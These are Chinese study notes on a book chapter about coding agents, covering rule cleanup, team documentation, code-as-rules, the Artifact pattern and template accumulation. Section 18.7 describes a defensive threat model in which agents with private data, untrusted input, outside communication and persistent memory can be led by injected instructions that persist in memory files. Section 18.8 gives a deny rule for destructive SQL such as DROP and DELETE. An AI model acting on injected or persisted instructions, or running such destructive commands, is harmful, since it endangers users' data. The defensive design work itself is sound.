| **识别冗余** | 检测重复或相似的规则 |
| **识别过时** | 检测与当前行为不符的规则 |
| **识别无效** | 检测没有实际作用的规则 |
| **清理合并** | 删除、合并、重写 |

**具体方法：**

| 方法 | 说明 |
|---|---|
| 版本控制 | 每条规则有版本，记录添加时间和原因 |
| 使用频率统计 | 统计每条规则被引用的次数 |
| A/B 测试 | 移除某条规则，看效果是否变化 |
| 定期审查 | 每季度审查一次规则集 |
| 合并相似规则 | 用更抽象的规则替代多条具体规则 |

**为什么一次成功修改不等于持续进化？**

**书中原话：**

> 保存经历不等于从经历中学习。把一百条轨迹放进长上下文或向量库，可以帮助模型在需要时找回某个案例，却不会自动完成跨案例比较。

| 维度 | 一次成功修改 | 持续进化 |
|---|---|---|
| 范围 | 单个案例 | 跨案例 |
| 方法 | 直接写入 | 评价、对照、归纳、验证 |
| 验证 | 无 | 有 |
| 可回滚 | 不一定 | 有 |
| 可复现 | 不一定 | 有 |

**关键原则：** 一次成功修改是"经验"，持续进化是"学习"。经验需要经过评价、对照、归纳、验证，才能成为学习。

**费曼式类比：** 你第一次做菜成功，不代表你学会了做菜。你需要：评价——这次成功是运气还是实力？对照——和其他做法对比，哪个更好？归纳——总结出通用规律。验证——下次再做，还能成功吗？这才是学习。

### 18.6 ★ 你的团队距离"AI-ready"还有多远？最大的障碍是什么？

**第一性原理：** AI-ready 的核心是**知识文档化**。知识必须存在于代码库本身，Agent 才读得到。

**书中标准：**

> 一个远程新人只靠代码仓库和文档，能不能独立开展工作。

**评估维度：**

| 维度 | 问题 |
|---|---|
| 决策记录 | 架构决策是否记录在文档里？ |
| 上下文 | Issue 和 PR 描述是否完整？ |
| 内部经验 | 开发者指南是否沉淀了经验？ |
| 代码规范 | 是否有明确的代码风格文档？ |
| 测试 | 是否有可运行的测试套件？ |

**最大障碍：**

| 障碍 | 说明 |
|---|---|
| 隐性知识 | 关键知识只在老员工脑子里 |
| 口头传承 | 业务规则靠口口相传 |
| 文档过时 | 文档没有及时更新 |
| 信息孤岛 | 信息分散在不同工具里 |
| 缺乏动力 | 没有激励写文档 |

**解决方案：**

| 方案 | 说明 |
|---|---|
| 文档驱动开发 | 先写文档，再写代码 |
| 决策记录 | 每个重要决策都记录 |
| Issue/PR 模板 | 强制填写背景和上下文 |
| 定期审查 | 定期检查文档时效性 |
| AI 辅助文档 | 用 Agent 生成和维护文档 |

**费曼式类比：** 你的团队像一个图书馆：如果书都锁在馆长脑子里，新员工没法工作；如果书都摆在书架上，新员工可以自学。AI-ready 就是让"书"都摆在书架上。

### 18.7 ★★★ 致命三要素 + 持久记忆：如何设计安全策略？

**第一性原理：** 四个要素构成一个完整攻击面：

```
访问私有数据 + 暴露于不受信任内容 + 具备外部通信能力 + 持久记忆 = 长期威胁
```

**四层防御体系：**

| 层 | 防御 | 说明 |
|---|---|---|
| **数据层** | 行级安全策略、租户隔离、访问上下文 | 即使被注入，也无法越权 |
| **输入层** | 来源标记、指令/数据分离、输入清洗 | 降低攻击成功率 |
| **执行层** | 权限控制、沙盒隔离、HITL | 危险动作需确认 |
| **记忆层** | 写入审查、来源追溯、定期审查 | 防止恶意指令潜伏 |

**持久记忆的特殊处理：**

| 措施 | 说明 |
|---|---|
| 写入审查 | 写入长期记忆的内容需经过与外部内容同等的信任审查 |
| 来源标记 | 每条记忆记录来源和采集时间 |
| 定期审查 | 定期审查记忆，删除可疑内容 |
| 隔离 | 不同来源的记忆隔离存储 |
| 版本控制 | 记忆的每次修改都有记录 |

**书中原话：**

> 写入长期记忆的内容需经过与外部内容同等的信任审查，避免恶意指令潜伏在 MEMORY.md 中长期生效。

**关键原则：** 持久记忆是攻击的放大器——把一次性攻击升级为长期威胁。防御不能只在输入层，必须延伸到记忆层。

**费曼式类比：** 你家的门锁：数据层是保险箱（即使进门也拿不走）；输入层是门卫（检查来客）；执行层是监控（记录行动）；记忆层是定期检查有没有人偷偷配了钥匙。

### 18.8 ★★ Artifact 模式：优劣与安全保证？

**第一性原理：** Artifact 模式的核心是**数据路径缩短**：数据从数据库直达用户界面，绕过 LLM。

**优势：**

| 优势 | 说明 |
|---|---|
| 快速 | LLM 不读数据，节省时间 |
| 准确 | LLM 不"抄写"数据，不会出错 |
| 节省 token | 不需要把数据传给 LLM |
| 可扩展 | 数据量大时仍高效 |

**劣势：**

| 劣势 | 说明 |
|---|---|
| 安全风险 | SQL 可能执行破坏性操作 |
| 漏洞风险 | HTML 可能包含漏洞 |
| 权限问题 | 需要独立的权限控制 |
| 复杂性 | 需要额外的基础设施 |

**安全保证：**

**SQL 安全：**

| 措施 | 说明 |
|---|---|
| 只读账号 | 使用只读数据库账号 |
| 语句白名单 | 只允许 SELECT 语句 |
| 拒绝 DDL/DML | 拒绝 DROP、DELETE、UPDATE |
| 参数化绑定 | 用户提供的值由服务端参数化绑定 |
| 限制查询 | 限制查询时间、返回行数、可访问的表 |
| 沙盒执行 | 可视化代码在隔离沙盒中运行 |

**HTML 安全：**

| 措施 | 说明 |
|---|---|
| 组件白名单 | 只允许渲染预定义组件 |
| 沙盒隔离 | 在隔离环境中运行 |
| 内容安全策略 | CSP 限制脚本执行 |
| 输出检查 | 检查输出内容 |

**书中原话：**

> 生成的 SQL 和可视化代码不能直接执行。执行层应使用只读数据库账号，解析 SQL 并只允许经过批准的 SELECT 语句，拒绝 DDL、DML 和多语句查询；用户提供的值应由服务端参数化绑定，同时限制查询时间、返回行数以及可访问的表和时间范围。

**关键原则：** Artifact 模式缩短了数据路径，但不能替代权限检查与执行隔离。

**费曼式类比：** 你让助理帮你查资料：传统模式是助理查完，抄写给你（可能抄错）；Artifact 模式是助理给你一个链接，你自己去看（准确）。但链接必须是安全的——你不能让助理给你一个钓鱼链接。

### 18.9 ★★ "代码即规则" vs 自然语言规则：优势与局限？

**第一性原理：** 核心区分：**规则的表达形式决定了它的执行效果。**

**对比：**

| 维度 | 自然语言规则 | 代码即规则 |
|---|---|---|
| 精确性 | 有歧义 | 无歧义 |
| 执行 | 依赖模型理解 | 确定性执行 |
| 可验证 | 难以验证 | 可程序化验证 |
| 灵活性 | 高（可解释、可变通） | 低（只能按代码执行） |
| 维护成本 | 低（写文字） | 高（写代码+测试） |
| 安全性 | 低（模型可能误解） | 高（不可绕过） |
| 可解释性 | 高（人类可读） | 中（需读代码） |

**优势：**

| 优势 | 说明 |
|---|---|
| 精确无歧义 | 代码逻辑不会"理解偏差" |
| 确定性执行 | 相同输入必产生相同输出 |
| 可程序化验证 | 可以写测试验证规则 |
| 难以绕过 | 代码是强制约束 |
| 适合复杂组合 | 多条件布尔组合、时间计算、跨数据源验证 |

**局限：**

| 局限 | 说明 |
|---|---|
| 灵活性低 | 代码只能按写好的逻辑执行 |
| 维护成本高 | 需要写代码、测试、部署 |
| 可解释性中 | 需要读代码才能理解 |
| 变更成本高 | 修改规则需要改代码 |
| 无法处理模糊情况 | 需要明确的条件 |

**最佳实践：两者结合**

**书中原话：**

> 实践中应结合使用：系统提示词包含自然语言规则供理解和沟通，关键决策点配备代码化校验工具作为"守门员"确保合规性。

**三重保障：**

| 层次 | 形式 | 作用 |
|---|---|---|
| 第一层 | 自然语言规则 | 帮助理解和解释 |
| 第二层 | 工具描述 + 参数 | 引导思考、减少无效调用 |
| 第三层 | 代码化校验 | 最后守门员 |

**费曼式类比：** 你教一个学生做菜：自然语言是"盐要少放"（帮助理解，但模糊）；代码是"盐的量 <= 5g"（精确，但死板）。最好的方式：先告诉他"盐要少放"（理解），再给他一个量勺（精确），最后用秤检查（守门员）。

## 十九、用户额外洞察：Agent 以代码为基础能力——从模糊需求到确定性约束

### 19.1 核心命题的精确化

| 层次 | 命题 | 本质 |
|---|---|---|
| 1 | Agent 以代码为基础能力 | 代码是 Agent 的通用表达介质 |
| 2 | 代码将模糊需求/规则转换为确定性约束 | 代码是"形式化"的工具 |
| 3 | 代码可形式化验证或易于验证 | 代码是"可自动化"的基础 |
| 4 | 交互中积累模板/示范代码，完成 action 处理 | 代码是"能力沉淀"的载体 |

**核心结论：**

> **Agent 的能力构建，本质上是"模糊 → 确定"的持续转化过程，而代码是这个过程的核心介质。**

### 19.2 第一性原理：为什么代码能完成"模糊 → 确定"的转化？

**模糊需求的本质：**

| 模糊需求 | 问题 |
|---|---|
| "帮我优化一下系统性能" | 优化什么？降低延迟？减少内存？提高吞吐？ |
| "这个退款请求合理吗？" | 什么算合理？7天内？有保险？未使用？ |
| "把桌面整理干净" | 哪些算垃圾？放到哪里？顺序如何？ |
| "写一份好的报告" | 什么是"好"？什么格式？什么长度？ |

**代码如何完成转化？**

**书中原话：**

> 业务规则、办事流程、决策逻辑如果仅用自然语言描述，往往充满歧义。相比之下，代码提供了无歧义、可执行的知识表达方式——要么成功运行，要么抛出错误，不存在模棱两可。

**转化的具体机制：**

| 模糊需求 | 代码化转化 | 确定性约束 |
|---|---|---|
| "优化性能" | `if latency > 100ms: optimize()` | 明确的阈值和动作 |
| "退款是否合理" | `if days <= 7 and has_insurance: refund()` | 明确的条件组合 |
| "整理桌面" | `pick(red_cup) → place(red_cup, tray)` | 明确的动作序列 |
| "写好的报告" | `if len(report) < 500 and has_chart: accept()` | 明确的验收标准 |

**费曼式类比：**

> 你说"把菜做得好吃一点"——这是模糊的。
> 你写成菜谱："盐 5g，糖 3g，火候中火 8 分钟"——这是确定的。
> 菜谱就是代码，代码就是把"好吃"翻译成"可执行步骤"。

### 19.3 "可验证 → 可自动化"的逻辑

**为什么代码可验证？**

| 验证类型 | 说明 | 例子 |
|---|---|---|
| **形式化验证** | 数学证明代码正确性 | Lean 定理证明 |
| **程序化验证** | 用测试验证代码行为 | 单元测试、集成测试 |
| **执行验证** | 运行代码看结果 | 编译、运行、检查输出 |
| **属性验证** | 检查代码的属性 | 类型检查、Linter |

**可验证 → 可自动化的逻辑链：**

```
代码可验证
    ↓
验证结果可自动获取
    ↓
Agent 可以根据验证结果自动调整
    ↓
形成"执行 → 验证 → 反馈 → 修正"的闭环
    ↓
可自动化
```

**自动化的四个层次：**

| 层次 | 自动化程度 | 例子 |
|---|---|---|
| **完全自动** | 无需人工 | 单元测试、类型检查 |
| **半自动** | 需要人工确认 | 代码审查、设计文档 |
| **辅助自动** | 人工主导，Agent 辅助 | 需求澄清、架构设计 |
| **无法自动** | 完全依赖人工 | 价值判断、伦理决策 |

### 19.4 "积累模板/示范代码"的机制

**为什么模板和示范代码重要？**

**书中原话：**

> 范例代码本身就是最佳实践的载体，Agent 基于范例修改比从零编写更容易做对，架构上的好选择会自然保留下来，而不需要在提示词里把每一条规则都说清楚。

**积累的三种形态：**

| 形态 | 说明 | 例子 |
|---|---|---|
| **模板代码** | 可复用的代码骨架 | 项目脚手架、API 调用模板 |
| **示范代码** | 经过验证的实现 | Agent 自举的范例 |
| **小工具代码** | 特定功能的封装 | 日志解析、数据清洗 |

**积累机制：**

```
用户提出需求
    ↓
Agent 生成代码
    ↓
代码执行成功
    ↓
验证通过
    ↓
沉淀为模板/示范代码
    ↓
下次遇到类似需求，直接复用
```

### 19.5 这个过程的边界与风险

**边界一：不是所有需求都能形式化**

| 需求类型 | 能否形式化 | 例子 |
|---|---|---|
| 确定性需求 | 能 | 计算、数据转换 |
| 规则性需求 | 能 | 业务规则、流程 |
| 模糊性需求 | 部分能 | "好的报告" |
| 创造性需求 | 难 | "写一首诗" |
| 价值判断 | 难 | "这个决策对吗" |

**边界二：模板可能过时**

| 风险 | 说明 |
|---|---|
| 依赖变化 | API 版本更新 |
| 环境变化 | 系统配置改变 |
| 需求变化 | 业务规则调整 |
| 上下文变化 | 应用场景不同 |

**边界三：积累可能变成负担**

| 风险 | 说明 |
|---|---|
| 规则膨胀 | 规则集不断增长 |
| 冲突 | 新旧规则矛盾 |
| 维护成本 | 需要定期清理 |
| 理解债 | 后来者看不懂 |

**边界四：一次成功 ≠ 持续进化**

| 维度 | 一次成功 | 持续进化 |
|---|---|---|
| 范围 | 单个案例 | 跨案例 |
| 方法 | 直接写入 | 评价、对照、归纳、验证 |
| 验证 | 无 | 有 |
| 可回滚 | 不一定 | 有 |

### 19.6 能力飞轮

```
用户交互
    ↓
理解模糊需求
    ↓
转化为代码
    ↓
执行验证
    ↓
成功 → 沉淀为模板
    ↓
下次更高效
    ↓
处理更复杂的需求
    ↓
积累更多模板
    ↓
（循环）
```

**飞轮的加速条件：**

| 条件 | 说明 |
|---|---|
| **验证越快** | 反馈越快，学习越快 |
| **模板越丰富** | 复用越多，效率越高 |
| **需求越多样** | 积累越多，能力越广 |
| **清理越及时** | 规则越精简，维护越低 |

### 19.7 总结

> **Agent 以代码为基础能力，本质上是把"模糊的需求"翻译成"确定的约束"，把"一次的成功"沉淀为"可复用的模板"，把"交互的经验"固化为"可执行的能力"。**
> **这是一个从模糊到确定、从经验到代码、从交互到能力的持续转化过程。**
> **代码不只是 Agent 的工具，它是 Agent 能力演化的载体。**

## 二十一、费曼式终极总结

**第5章的核心：**

> 代码不只是写程序的工具，它是 Agent 形式化思考和精确表达的语言。
> 代码生成是通用性最强的元能力——能在运行时动态创造出新的工具和能力。

**两个核心结论：**

> **结论一**：Coding Agent 成熟度高，不是因为代码生成模型特别强，而是因为软件工程几十年攒下的基础设施——测试套件、类型系统、版本控制——天然构成了一套强大的 Harness。
> **结论二**：Agent 的可靠性不取决于模型犯不犯错，而取决于每类故障是否都有对应的检测、恢复、接管与终止路径。

**六个应用方向：**

> 思考工具、业务规则约束、多媒体生成、系统适配器、生成式 UI、Agent 自举。

**代码对 Agent 的价值：**

> 它既是完成任务的手段，也是积累知识、创造工具、优化自身的机制。

**用户额外洞察：**

> Agent 以代码为基础能力，本质上是把"模糊的需求"翻译成"确定的约束"，把"一次的成功"沉淀为"可复用的模板"，把"交互的经验"固化为"可执行的能力"。

**一句话：**

> **代码生成是一种元能力——能创造其他能力的能力。**
> **它让 Agent 在运行时动态扩展边界，而不必事先预制所有工具。**
> **从思考工具到业务规则，从多媒体生成到系统适配器，从生成式 UI 到 Agent 自举，代码贯穿了 Agent 的整个能力体系。**
> **代码不仅是完成任务的手段，更是积累知识、创造工具、优化自身的机制。**
> **至此，我们已经把上下文、知识、工具与代码能力组合成通用 Agent 的基础架构。但前五章仍默认 Agent 与世界轮流行动。第六章将补上"构建 Agent"的最后一块，把观察与动作空间扩展到异步事件、语音、屏幕和物理世界。**

思考题
1. ★★ 代码生成被称为 Agent 的“元能力”。但代码执行引入了安全风险——Agent 生成的代码可能包含漏
洞、无限循环或资源耗尽。沙盒隔离能解决部分问题，但也限制了代码能力（比如无法访问网络或文件
系统）。如何在安全性和能力之间找到最优平衡点？
2. ★★★ Agent 自举——能创造 Agent 的 Agent——实现了“智能的自我繁殖”。但每次自举都可能引入新
的偏差或错误，这种错误会在代际间累积吗？如何防止 Agent 自举的退化？
3. ★★ 代码生成 Agent 在处理日志解析时，能自动跟随格式演化。但如果格式变化是一个 bug 而非预期
改动，Agent 的适应性反而掩盖了问题。Agent 应该如何区分“需要适应的变化”和“需要报告的异常”？
4. ★★ 本章在 PPT 生成、视频编辑和日志可视化中反复使用提议者-审核者机制。如果 Reviewer 的审美
偏好与目标用户不一致，比如 Reviewer 认为信息密度合理但用户觉得太拥挤，反馈循环会收敛到错误
的局部最优。如何让用户的偏好反馈也参与 Reviewer 循环？
5. ★★ 本章展示了 Coding Agent 把执行和调试中获得的经验沉淀回代码库的多种方式——写入知识库文
件、更新架构文档、维护项目指令文件、把操作序列固化为代码。如果把这些经验进一步提炼为系统提
示词中的规则，规则集会随时间不断膨胀。如何对沉淀下来的规则做“垃圾回收”——识别并清理冗余或
过时的条目？为什么一次成功的代码修改还不能直接视为第九章所说的持续进化？
6. ★ “对远程工作友好的团队往往也对 AI Agent 友好。”你所在的团队或组织，在知识文档化方面距离
“AI-ready”还有多远？最大的障碍是什么？
7. ★★★ Simon Willison 提出了 Agent 的“致命三要素”（访问私有数据、暴露于不受信任内容、具备外部
通信能力），本章在此基础上增加了第四个——持久记忆。在一个需要同时处理这四种要素的生产环境
中，你会如何设计安全策略？
8. ★★ Artifact 模式让 Agent 生成 SQL 或前端代码，由数据库和浏览器直接执行，绕过 LLM 处理大量
数据。与传统的“Agent 直接给出答案”相比，这种“Agent 生成代码、系统执行代码”的分工有什么优劣？
生成的 SQL 可能执行破坏性操作、生成的 HTML 可能包含漏洞，又该如何确保安全？
9. ★★ 将业务规则编码为工具内部基于数据库真值的校验，并用参数设计引导模型在调用前核对政策条件，本质上是用代码结构来约束 Agent 行为。这种“代码即规则”的模式相比自然语言规则有什么优势和局限？
